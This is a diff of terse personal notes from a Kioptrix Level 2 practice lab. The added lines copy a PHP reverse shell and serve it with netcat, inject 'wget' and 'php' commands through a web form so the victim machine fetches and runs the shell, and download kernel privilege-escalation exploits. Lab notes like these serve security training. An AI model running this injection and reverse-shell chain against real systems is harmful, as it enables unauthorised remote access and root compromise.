@@ -37,6 +37,18 @@ nc -nlvp 4444
 2.0.1.2 var 2
 http://hacktips.it/imparare-sfruttare-vulnerabilita-kioptrix-livello-1-1/
 <from this place!!!>
+#copy web shell
+cp /usr/share/webshells/php/php-reverse-shell.php ~/
+#transfer shel to victim mashine
+cat php-reverse-shell.php | nc -l -p 3333
+#from victom mashine (in the web form)
+; wget <ip>:3333 -O /tmp/rshell.php
+#from host mashine
+nc -l -p 3333
+#from victim mashine (in the web form)
+; php /tmp/rshell.php
+
+
 2.1 Alternative with mfsvenom
 #use msf
 #problem with "msfpayload not found"
@@ -77,6 +89,7 @@ Linux version 2.6.9-55.EL i686
 
 
 
+
 #searchsploit centos local
 #1st
 Linux Kernel 2.6.32 < 3.x.x (CentOS) - 'PERF_EVENTS' Privilege Escalation (1)                                                                                                   | linux/local/25444.c
@@ -96,5 +109,11 @@ Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubunt
 wget https://www.exploit-db.com/download/9545 --no-check-certificate
 #not work
 #because this exploit work in 64-bit OS
- 
+#but work
+https://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c
+#form
+https://www.doyler.net/security-not-included/kioptrix-level-1-1-2-walkthrough 
+
+#4rd
+wget https://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c --no-check-certificate
 
